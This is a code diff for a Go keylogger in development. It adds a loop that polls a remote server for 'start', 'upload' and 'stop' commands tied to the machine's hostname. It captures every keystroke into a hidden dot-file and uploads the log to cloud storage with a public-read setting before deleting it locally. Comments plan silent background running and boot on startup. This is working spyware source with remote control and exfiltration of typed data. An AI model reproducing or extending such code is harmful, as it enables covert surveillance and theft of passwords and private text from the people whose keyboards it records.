@@ -14,7 +14,6 @@ import (
 )
 
 // TO IMPLEMENT:
-// Delete all text files
 // Make it run silently in the bg
 // Find a way to implement boot on startup
 
@@ -31,38 +30,46 @@ func main() {
 		panic(err)
 	}
 
-	putHost(hostName)
-	fmt.Println(getCmd(hostName))
+	cmdChan := make(chan string)
+	go pollCmds(hostName, cmdChan)
 
-	// for {
-	// 	cmd := getCmd(hostName)
-	// 	switch cmd {
-	// 	case "start":
-	// 		start_keylog()
-	// 	case "upload"
-	// 		uploadFile()
-	// 	case "stop"
-	// 		stop_keylog()
-	// 	}
-	// }
-	keylog()
+	fmt.Println("test")
+
+	for {
+		cmd := <-cmdChan
+		if cmd == "start" {
+			go startKeylog(hostName, cmdChan)
+		}
+		if cmd == "upload" {
+			go startKeylog(hostName, cmdChan)
+		}
+	}
 }
 
-func keylog() {
+func pollCmds(hostName string, cmdChan chan<- string) {
+	var lastCmd string
 
-	// Start the listening process
+	for {
+		time.Sleep(5 * time.Second)
+		cmd := getCmd(hostName)
+		if cmd != lastCmd { 
+			lastCmd = cmd
+			cmdChan <- cmd
+		}
+	}
+}
+
+func stopKeylog() {
+	hook.End()
+}
+
+func startKeylog(hostName string, cmdChan chan string) {
 	evChan := hook.Start()
 	defer hook.End()
 
 	var lastTime time.Time
 	runTime := time.Now()
 
-	hostName, err := os.Hostname()
-	if err != nil {
-		panic(err)
-	}
-
-	// need to test if the name actually changes.
 	fileName := fmt.Sprintf(".%s - %s %s.txt",
 	hostName,
 	runTime.Format("Jan 02 2006"),
@@ -74,37 +81,9 @@ func keylog() {
 	}
 	defer file.Close()
 
-	for ev := range evChan {
-		if ev.Kind == hook.KeyDown {
-			// 27 == esc - temp
-			if ev.Keychar == 27 {
-				err = uploadFile(fileName)
-				os.Remove(fileName)
-				if err != nil {
-					panic(err)
-				}
-				break
-			}
-
-			// To change - Idk if i should set this to 1 hr / 6 hrs ?
-			if time.Since(runTime).Minutes() >= 1 {
-				err = uploadFile(fileName)
-				os.Remove(fileName)
-				if err != nil {
-					panic(err)
-				}
-				file.Close()
-				fileName := fmt.Sprintf(".%s - %s %s.txt",
-				hostName,
-				runTime.Format("Jan 02 2006"),
-				runTime.Format(time.Kitchen))
-				file, err = os.Create(fileName)
-				if err != nil {
-					panic(err)
-				}
-				runTime = time.Now()
-			}
-
+	for {
+		select {
+		case ev := <-evChan:
 			// Calcs diff between time
 			now := time.Now()
 			var diff time.Duration
@@ -112,15 +91,22 @@ func keylog() {
 				diff = now.Sub(lastTime)
 			}
 			lastTime = now
-
+	
 			// If diff > 5 print a new line for ease of reading
 			if diff.Seconds() > 5 {
 				file.WriteString("\n")
 			}
-
+	
 			// Print to file any keystroke recorded and their keychar value
 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
-
+		case cmd := <-cmdChan:
+			if cmd == "upload" {
+				uploadFile(fileName)
+			}
+			if cmd == "stop" {
+				file.Close()
+				return
+			}
 		}
 	}
 }
@@ -145,6 +131,9 @@ func uploadFile(fileName string) error {
 		Body:   file,
 		ACL:    aws.String("public-read"),
 	})
+
+	os.Remove(fileName)
+
 	return err
 }
 
@@ -193,3 +182,80 @@ func putHost(hostName string) error {
 
 	return err
 }
+
+// func keylog(string hostName) {
+
+// 	// Start the listening process
+// 	evChan := hook.Start()
+// 	defer hook.End()
+
+// 	var lastTime time.Time
+// 	runTime := time.Now()
+
+// 	// hostName, err := os.Hostname()
+// 	// if err != nil {
+// 	// 	panic(err)
+// 	// }
+
+// 	// need to test if the name actually changes.
+// 	fileName := fmt.Sprintf(".%s - %s %s.txt",
+// 	hostName,
+// 	runTime.Format("Jan 02 2006"),
+// 	runTime.Format(time.Kitchen))
+
+// 	file, err := os.Create(fileName)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	defer file.Close()
+
+// 	for ev := range evChan {
+// 		if ev.Kind == hook.KeyDown {
+// 			// 27 == esc - temp
+// 			if ev.Keychar == 27 {
+// 				err = uploadFile(fileName)
+// 				os.Remove(fileName)
+// 				if err != nil {
+// 					panic(err)
+// 				}
+// 				break
+// 			}
+
+// 			// To change - Idk if i should set this to 1 hr / 6 hrs ?
+// 			if time.Since(runTime).Minutes() >= 1 {
+// 				err = uploadFile(fileName)
+// 				os.Remove(fileName)
+// 				if err != nil {
+// 					panic(err)
+// 				}
+// 				file.Close()
+// 				fileName := fmt.Sprintf(".%s - %s %s.txt",
+// 				hostName,
+// 				runTime.Format("Jan 02 2006"),
+// 				runTime.Format(time.Kitchen))
+// 				file, err = os.Create(fileName)
+// 				if err != nil {
+// 					panic(err)
+// 				}
+// 				runTime = time.Now()
+// 			}
+
+// 			// Calcs diff between time
+// 			now := time.Now()
+// 			var diff time.Duration
+// 			if !lastTime.IsZero() {
+// 				diff = now.Sub(lastTime)
+// 			}
+// 			lastTime = now
+
+// 			// If diff > 5 print a new line for ease of reading
+// 			if diff.Seconds() > 5 {
+// 				file.WriteString("\n")
+// 			}
+
+// 			// Print to file any keystroke recorded and their keychar value
+// 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
+
+// 		}
+// 	}
+// }
